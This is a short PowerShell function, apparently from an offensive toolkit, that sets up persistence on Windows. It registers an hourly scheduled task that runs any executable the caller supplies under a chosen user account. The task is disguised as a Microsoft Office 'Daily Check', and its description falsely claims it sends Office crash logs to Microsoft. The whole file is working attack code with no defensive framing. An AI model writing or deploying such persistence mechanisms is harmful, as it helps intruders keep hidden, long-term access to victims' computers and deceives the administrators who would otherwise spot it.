function Invoke-S4U-persistence
{
    [CmdletBinding()]
    Param(
        [string]$exePath,
        [string]$sessionUserID
    )
    $xmlContent = @'
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Author>Windows office</Author>
	<URI>\Daily Check</URI>
  </RegistrationInfo>
  <Triggers>
    <CalendarTrigger id="DailyTrigger1">
      <Repetition>
        <Interval>PT1H</Interval>
        <Duration>P1D</Duration>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>2005-01-01T10:55:00</StartBoundary>
      <EndBoundary>2030-12-12T10:05:00</EndBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>{0}</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <Duration>PT10M</Duration>
      <WaitTimeout>PT1H</WaitTimeout>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>{1}</Command>
    </Exec>
  </Actions>
</Task>
'@ -f $sessionUserID, $exePath

    $TaskName = "Daily Check"
    $TaskDescription = "This task monitors the state of your Microsoft Office ClickToRunSvc and sends crash and error logs to Microsoft."
    $service = new-object -ComObject("Schedule.Service")
    $service.Connect()
    $rootFolder = $service.GetFolder("\")
    $TaskDefinition = $service.NewTask(0)
    $TaskDefinition.XmlText = $xmlContent
    #http://msdn.microsoft.com/en-us/library/windows/desktop/aa381365(v=vs.85).aspx
    $rootFolder.RegisterTaskDefinition($TaskName, $TaskDefinition, 6, $null, $null, 3)
}


